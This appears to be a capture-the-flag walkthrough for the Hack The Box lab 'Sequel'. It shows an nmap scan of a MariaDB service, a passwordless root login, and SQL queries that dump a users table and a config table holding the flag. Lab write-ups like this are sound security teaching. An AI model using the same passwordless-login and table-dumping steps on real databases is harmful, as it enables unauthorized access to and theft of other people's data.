# Sequel

## Enumeration

### nmap

```
PORT     STATE SERVICE REASON  VERSION
3306/tcp open  mysql?  syn-ack
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, LongColumnFlag, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, ODBCClient, Support41Auth, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: lO&lng:)]xer/1EJ$p,*
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
```

Ok who didnt see that one coming?

I don't know anyone that pronouce it sequel (even though its correct)

`mysql -h 10.129.143.140 -u root`

bold move to go root directly

```
SHOW DATABASES;

+--------------------+
| Database |
+--------------------+
| htb |
| information_schema |
| mysql |
| performance_schema |
+--------------------+
```

```
USE htb;
SHOW TABLES;

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config |
| users |
+---------------+
```

```
SELECT \* FROM users;
+----+----------+------------------+
| id | username | email |
+----+----------+------------------+
| 1 | admin | admin@sequel.htb |
| 2 | lara | lara@sequel.htb |
| 3 | sam | sam@sequel.htb |
| 4 | mary | mary@sequel.htb |
+----+----------+------------------+
4 rows in set (0.156 sec)
```

```
SELECT \* FROM config;

+----+-----------------------+----------------------------------+
| id | name | value |
+----+-----------------------+----------------------------------+
| 1 | timeout | 60s |
| 2 | security | default |
| 3 | auto_logon | false |
| 4 | max_size | 2M |
| 5 | flag | flag_in_plain_sight_here |
| 6 | enable_uploads | false |
| 7 | authentication_method | radius |
+----+-----------------------+----------------------------------+
7 rows in set (0.173 sec)
```

And flag is acquired from the database

Do you need anything else? tea? coffee? oscp certifcate?
